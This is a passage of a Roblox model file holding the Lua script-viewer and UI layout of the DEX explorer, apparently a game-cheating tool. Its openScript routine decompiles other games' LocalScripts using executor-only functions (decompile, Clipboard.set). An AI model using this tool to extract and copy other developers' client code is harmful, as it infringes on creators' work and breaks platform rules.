	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

-- End Scrollbar

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 16
Create(scrollBar.GUI,{
	Position = UDim2.new(1,0,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = editorGrid;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = 8
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,0);
	Size = UDim2.new(1,0,0,ScrollBarWidth);
	Parent = editorGrid;
})

local entries = {}

local grid = {}

local count = 1
local xCount = 1

local lineSpan = 0

for i = 0,490,8 do
	local newRow = {}
	for j = 0,390,16 do
		local cellText = Instance.new("TextLabel",editorGrid)
		cellText.BackgroundTransparency = 1
		cellText.BorderSizePixel = 0
		cellText.Text = ""
		cellText.Position = UDim2.new(0,i,0,j)
		cellText.Size = UDim2.new(0,8,0,16)
		cellText.Font = Enum.Font.SourceSans
		cellText.FontSize = Enum.FontSize.Size18
		table.insert(newRow,cellText)
		xCount = xCount + 1
	end
	table.insert(grid,newRow)
	count = count + 1
	xCount = 1
end

local syntaxHighlightList = {
	{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "while", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "end", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "function", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "string", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "table", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "game", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "workspace", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "return", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "break", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "elseif", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "in", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "pairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "ipairs", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true}
}

function checkMouseInGui(gui)
	if gui == nil then return false end
	local plrMouse = game.Players.LocalPlayer:GetMouse()
	local guiPosition = gui.AbsolutePosition
	local guiSize = gui.AbsoluteSize	
	
	if plrMouse.X >= guiPosition.x and plrMouse.X <= guiPosition.x + guiSize.x and plrMouse.Y >= guiPosition.y and plrMouse.Y <= guiPosition.y + guiSize.y then
		return true
	else
		return false
	end
end

function AddZeros(num,reach)
	local toConvert = tostring(num)
	while #toConvert < reach do
		toConvert = " "..toConvert
	end
	return toConvert
end

function buildScript(source,xOff,yOff,override)
	local buildingRows = true
	local buildScr = source
	
	local totalLines = 0
	
	--print(xOff,yOff)
	
	if currentSource ~= source then
		currentSource = source
	end

	if override then
		currentSource = source
		entries = {}
		while buildingRows do
			local x,y = string.find(buildScr,"\n")
			if x and y then
				table.insert(entries,string.sub(buildScr,1,y))
				buildScr = string.sub(buildScr,y+1,string.len(buildScr))
			else
				buildingRows = false
				table.insert(entries,buildScr)
			end
		end
	end
	
	totalLines = #entries
	lineSpan = #tostring(totalLines)
	
	if lineSpan == 1 then lineSpan = 2 end
	
	local currentRow = 1
	local currentColumn = 2 + lineSpan
	
	local colorTime = 0
	local colorReplace = nil
	
	local inString = false
	
	local workingEntries = entries
	
	--[[
	for i,v in pairs(entries) do
		table.insert(workingEntries,v)
	end
	
	for i = 1,yOff do
		table.remove(workingEntries,1)
	end
	--]]
	
	local delayance = xOff

	for i = 1,#grid do
		for j = 1,#grid[i] do
			if i <= lineSpan then
				local newNum = AddZeros(yOff + j,lineSpan)
				local newDigit =  string.sub(newNum,i,i)
				if newDigit == " " then
					grid[i][j].Text = ""
				else
					grid[i][j].Text = newDigit
				end
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(163/255, 162/255, 165/255)
				--grid[i][j].Font = Enum.Font.SourceSansBold
			elseif i == lineSpan + 1 then
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 0
				grid[i][j].BackgroundColor3 = Color3.new(200/255, 200/255, 200/255)
				--grid[i][j].Font = Enum.Font.SourceSans
			else
				grid[i][j].Text = ""
				grid[i][j].BackgroundTransparency = 1
				--grid[i][j].Font = Enum.Font.SourceSans
			end
		end
	end
	
	while true do
		if currentRow > #workingEntries or currentRow > #grid[1] then break end
		local entry = workingEntries[currentRow+yOff]
		while string.len(entry) > 0 do
			if string.sub(entry,1,1) == "\t" then entry = "    "..string.sub(entry,2) end
			
			if currentColumn > #grid then break end
			
			if delayance == 0 then
				grid[currentColumn][currentRow].Text = string.sub(entry,1,1)
			end
			
			-- Coloring
			
			if not inString then
				for i,v in pairs(syntaxHighlightList) do
					if string.sub(entry,1,string.len(v["Keyword"])) == v["Keyword"] then
						if v["Independent"] then
							local outCheck = string.len(v["Keyword"])+1
							local outEntry = string.sub(entry,outCheck,outCheck)
							if not string.find(outEntry,"%w") then
								colorTime = string.len(v["Keyword"])
								colorReplace = v["Color"]
							end
						else
							colorTime = string.len(v["Keyword"])
							colorReplace = v["Color"]
						end
					end
				end
			end
			
			if string.sub(entry,1,1) == "\"" and string.match(entry,"\".+\"") then
				inString = true
				colorTime = string.len(string.match(entry,"\".+\""))
				colorReplace = Color3.new(170/255, 0, 1)
			end
			
			if colorTime > 0 then
				colorTime = colorTime - 1
				grid[currentColumn][currentRow].TextColor3 = colorReplace
				if colorTime == 0 then inString = false end
			else
				grid[currentColumn][currentRow].TextColor3 = Color3.new(0,0,0)
				inString = false
			end
			
			if delayance == 0 then
				currentColumn = currentColumn + 1
			else
				delayance = delayance - 1
			end
			entry = string.sub(entry,2,string.len(entry))
		end
		currentRow = currentRow + 1
		currentColumn = 2 + lineSpan
		colorTime = 0
		delayance = xOff
		inString = false
	end
end

function scrollBar.UpdateCallback(self)
	scrollBar.TotalSpace = #entries * 16
	scrollBar.VisibleSpace = editorGrid.AbsoluteSize.Y
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function scrollBarH.UpdateCallback(self)
	scrollBarH.TotalSpace = (getLongestEntry(entries) + 1 + lineSpan) * 8
	scrollBarH.VisibleSpace = editorGrid.AbsoluteSize.X
	buildScript(currentSource,math.floor(scrollBarH.ScrollIndex/8),math.floor(scrollBar.ScrollIndex/16))
end

function getLongestEntry(tab)
	local longest = 0
	for i,v in pairs(tab) do
		if string.len(v) > longest then
			longest = string.len(v)
		end
	end
	return longest
end

function openScript(scrObj)
	if scrObj:IsA("LocalScript") then
		scrObj.Archivable = true
		scrObj = scrObj:Clone()
		scrObj.Disabled = true
	end
	
	local scrName = scrObj.Name
	local scrSource = decompile(scrObj)
	
	table.insert(memoryScripts,{Name = scrName,Source = scrSource})
	
	local newTab = entryTemplate:Clone()
	newTab.Button.Text = scrName
	newTab.Position = UDim2.new(0,#scriptBar:GetChildren() * 100,0,0)
	newTab.Visible = true
	
	newTab.Button.MouseButton1Down:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				editingIndex = i
				buildScript(memoryScripts[i].Source,0,0,true)
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
			end
		end
	end)
	
	newTab.Close.MouseButton1Click:connect(function()
		for i,v in pairs(scriptBar:GetChildren()) do
			if v == newTab then
				table.remove(memoryScripts,i)
				if editingIndex == i then
					editingIndex = #memoryScripts
					if editingIndex > 0 then
						buildScript(memoryScripts[#memoryScripts].Source,0,0,true)
					else
						buildScript("",0,0,true)
					end
				end
				
				scrollBar:ScrollTo(1)
				scrollBar:Update()
				scrollBarH:ScrollTo(1)
				scrollBarH:Update()
				
				for i2 = i,#scriptBar:GetChildren() do
					scriptBar:GetChildren()[i2].Position = scriptBar:GetChildren()[i2].Position + UDim2.new(0,-100,0,0)
				end
				if editingIndex > i then
					editingIndex = editingIndex - 1
				end
				newTab:Destroy()
			end
		end
	end)
	
	editingIndex = #memoryScripts
	buildScript(scrSource,0,0,true)
	
	newTab.Parent = scriptBar
end

function updateScriptBar()
	local entryCount = 0
	
	scriptBarLeft.Active = false
	scriptBarLeft.AutoButtonColor = false
	for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	scriptBarRight.Active = false
	scriptBarRight.AutoButtonColor = false
	for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
		v.BackgroundTransparency = 0.7
	end
	for i,v in pairs(scriptBar:GetChildren()) do
		if v.Position.X.Offset < 0 then
			scriptBarLeft.Active = true
			scriptBarLeft.AutoButtonColor = true
			for i,v in pairs(scriptBarLeft["Arrow Graphic"]:GetChildren()) do
				v.BackgroundTransparency = 0
			end
		elseif v.Position.X.Offset >= 0 then
			entryCount = entryCount + 1
			if entryCount == 5 then
				scriptBarRight.Active = true
				scriptBarRight.AutoButtonColor = true
				for i,v in pairs(scriptBarRight["Arrow Graphic"]:GetChildren()) do
					v.BackgroundTransparency = 0
				end
			end
		end
	end
end

scriptBar.ChildAdded:connect(updateScriptBar)
scriptBar.ChildRemoved:connect(updateScriptBar)

scriptBarLeft.MouseButton1Click:connect(function()
	if scriptBarLeft.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,100,0,0)
	end
	updateScriptBar()
end)

scriptBarRight.MouseButton1Click:connect(function()
	if scriptBarRight.Active == false then return end
	for i,v in pairs(scriptBar:GetChildren()) do
		v.Position = v.Position + UDim2.new(0,-100,0,0)
	end
	updateScriptBar()
end)

mouse.Button1Down:connect(function()
	if checkMouseInGui(editorGrid) then
		--print("LETS EDIT!")
	end
end)

openEvent.Event:connect(function(...)
	top.Visible = true
	local args = {...}
	if #args > 0 then
		openScript(args[1])
	end
end)

clipboardButton.MouseButton1Click:connect(function()
	if Clipboard and Clipboard.set then
		Clipboard.set(currentSource)
	elseif CopyString then
		CopyString(currentSource)
	end
end)

closeButton.MouseButton1Click:connect(function()
	top.Visible = false
end)

--[[
local scr = script.Parent:WaitForChild("Scr")
local scr2 = script.Parent:WaitForChild("Scr2")
local scr3 = script.Parent:WaitForChild("Scr3")
local scr4 = script.Parent:WaitForChild("TOS")
local scr5 = script.Parent:WaitForChild("HW")
--]]

buildScript("",0,0,true)
--[[
openScript(scr)
openScript(scr2)
openScript(scr3)
openScript(scr4)
openScript(scr5)
--]]

scrollBar:Update()
scrollBarH:Update()]]></ProtectedString>
						</Properties>
					</Item>
					<Item class="TextButton" referent="RBX30DAF84493C34308B09EBED9F4EF97CC">
						<Properties>
							<bool name="Active">true</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<bool name="AutoButtonColor">true</bool>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4278190080</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">3</token>
							<token name="FontSize">5</token>
							<bool name="Modal">false</bool>
							<string name="Name">Close</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>1</XS>
								<XO>-20</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">true</bool>
							<bool name="Selected">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>20</XO>
								<YS>0</YS>
								<YO>20</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<string name="Text">X</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">14</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">false</bool>
							<token name="TextXAlignment">2</token>
							<token name="TextYAlignment">1</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">5</int>
						</Properties>
					</Item>
				</Item>
				<Item class="Frame" referent="RBX9571D5FBBFB34F43A5F8EC913C454F04">
					<Properties>
						<bool name="Active">false</bool>
						<Vector2 name="AnchorPoint">
							<X>0</X>
							<Y>0</Y>
						</Vector2>
						<Color3 name="BackgroundColor3">4294309365</Color3>
						<float name="BackgroundTransparency">0</float>
						<Color3 name="BorderColor3">4279970357</Color3>
						<int name="BorderSizePixel">0</int>
						<bool name="ClipsDescendants">false</bool>
						<bool name="Draggable">false</bool>
						<string name="Name">IntroFrame</string>
						<Ref name="NextSelectionDown">null</Ref>
						<Ref name="NextSelectionLeft">null</Ref>
						<Ref name="NextSelectionRight">null</Ref>
						<Ref name="NextSelectionUp">null</Ref>
						<UDim2 name="Position">
							<XS>1</XS>
							<XO>30</XO>
							<YS>0</YS>
							<YO>0</YO>
						</UDim2>
						<float name="Rotation">0</float>
						<bool name="Selectable">false</bool>
						<Ref name="SelectionImageObject">null</Ref>
						<UDim2 name="Size">
							<XS>0</XS>
							<XO>300</XO>
							<YS>1</YS>
							<YO>0</YO>
						</UDim2>
						<token name="SizeConstraint">0</token>
						<token name="Style">0</token>
						<bool name="Visible">true</bool>
						<int name="ZIndex">2</int>
					</Properties>
					<Item class="Frame" referent="RBX01B145B372654E9593D9AA9EBC13E8E1">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294309365</Color3>
							<float name="BackgroundTransparency">0</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">0</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<string name="Name">Main</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>-30</XO>
								<YS>0</YS>
								<YO>0</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>30</XO>
								<YS>0</YS>
								<YO>90</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<token name="Style">0</token>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="ImageLabel" referent="RBX76C7A46A259F45A98E2E239D1AC70F55">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<Content name="Image"><url>http://unixfr.xyz/asset/?id=483437370</url></Content>
							<Color3 name="ImageColor3">4294309365</Color3>
							<Vector2 name="ImageRectOffset">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Vector2 name="ImageRectSize">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<float name="ImageTransparency">0</float>
							<string name="Name">Sad</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>50</XO>
								<YS>1</YS>
								<YO>-300</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<token name="ScaleType">0</token>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>200</XO>
								<YS>0</YS>
								<YO>200</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<Rect2D name="SliceCenter">
								<min>
									<X>0</X>
									<Y>0</Y>
								</min>
								<max>
									<X>0</X>
									<Y>0</Y>
								</max>
							</Rect2D>
							<bool name="Visible">true</bool>
							<int name="ZIndex">2</int>
						</Properties>
					</Item>
					<Item class="TextLabel" referent="RBX5EDAFAA44E414CC392644C3AF6A5C0CA">
						<Properties>
							<bool name="Active">false</bool>
							<Vector2 name="AnchorPoint">
								<X>0</X>
								<Y>0</Y>
							</Vector2>
							<Color3 name="BackgroundColor3">4294967295</Color3>
							<float name="BackgroundTransparency">1</float>
							<Color3 name="BorderColor3">4279970357</Color3>
							<int name="BorderSizePixel">1</int>
							<bool name="ClipsDescendants">false</bool>
							<bool name="Draggable">false</bool>
							<token name="Font">4</token>
							<token name="FontSize">13</token>
							<string name="Name">Title</string>
							<Ref name="NextSelectionDown">null</Ref>
							<Ref name="NextSelectionLeft">null</Ref>
							<Ref name="NextSelectionRight">null</Ref>
							<Ref name="NextSelectionUp">null</Ref>
							<UDim2 name="Position">
								<XS>0</XS>
								<XO>100</XO>
								<YS>0</YS>
								<YO>150</YO>
							</UDim2>
							<float name="Rotation">0</float>
							<bool name="Selectable">false</bool>
							<Ref name="SelectionImageObject">null</Ref>
							<UDim2 name="Size">
								<XS>0</XS>
								<XO>100</XO>
								<YS>0</YS>
								<YO>60</YO>
							</UDim2>
							<token name="SizeConstraint">0</token>
							<string name="Text">DEX</string>
							<Color3 name="TextColor3">4279970357</Color3>
							<bool name="TextScaled">false</bool>
							<float name="TextSize">60</float>
							<Color3 name="TextStrokeColor3">4278190080</Color3>
							<float name="TextStrokeTransparency">1</float>
							<float name="TextTransparency">0</float>
							<bool name="TextWrapped">true</bool>
							<token name="TextXAlignment">2</token>
